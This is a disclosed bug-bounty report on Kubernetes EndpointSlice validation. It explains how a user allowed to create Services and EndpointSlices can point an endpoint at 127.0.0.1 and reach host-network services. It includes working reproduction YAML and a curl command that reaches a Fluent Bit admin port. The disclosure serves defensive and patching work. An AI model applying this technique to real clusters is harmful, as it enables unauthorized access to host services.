# Holes in EndpointSlice Validation Enable Host Network Hijack

## Report Details
- **Report ID**: 1145044
- **URL**: https://hackerone.com/reports/1145044
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-04-02T00:59:23.695Z
- **Disclosed**: 2021-09-05T23:29:06.790Z

## Reporter
- **Username**: howardjohn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
## Summary:
A user with permission to create Services and EndpointSlices can configure these resources to allow sending traffic to arbitrary ports in the host network.

## Kubernetes Version:
Any version with `EndpointSliceProxying` enabled, default in 1.19+

## Component Version:
1.19+

## Steps To Reproduce:

Apply YAML:
```
apiVersion: v1
kind: Service
metadata:
  labels:
    component: apiserver
  name: hijack
  namespace: attacker
spec:
  ports:
  - name: http
    port: 2020
    protocol: TCP
---
addressType: IPv4
apiVersion: discovery.k8s.io/v1beta1
endpoints:
- addresses:
  - 127.0.0.1
  conditions:
    ready: true
kind: EndpointSlice
metadata:
  labels:
    kubernetes.io/service-name: hijack
  name: hijack
  namespace: attacker
ports:
- name: http
  port: 2020
  protocol: TCP
```

Inside a pod in the cluster, send a curl request to the service:
```
$ curl hijack.attacker:2020/api/v1/uptime
{"uptime_sec":57070,"uptime_hr":"Fluent Bit has been running:  0 day, 15 hours, 51 minutes and 10 seconds"}
```

Here I chose to reach the Fluent Bit admin interface running on port 2020 in the host network; any other services can also be hit by adding the port into the Service and EndpointSlice.

## Supporting Material/References:

This vulnerability does not apply to Endpoints, which would reject this in validation: https://github.com/kubernetes/kubernetes/blob/a651804427dd9a15bb91e1c4fb7a79994e4817a2/pkg/apis/core/validation/validation.go#L5762.

However, EndpointSlice validation is more lenient: https://github.com/kubernetes/kubernetes/blob/a651804427dd9a15bb91e1c4fb7a79994e4817a2/staging/src/k8s.io/apimachinery/pkg/util/validation/validation.go#L356

## Impact

User with permission to create Services and EndpointSlice, a relatively unprivileged role, can access arbitrary services in the host network.

## Attachments
No attachments
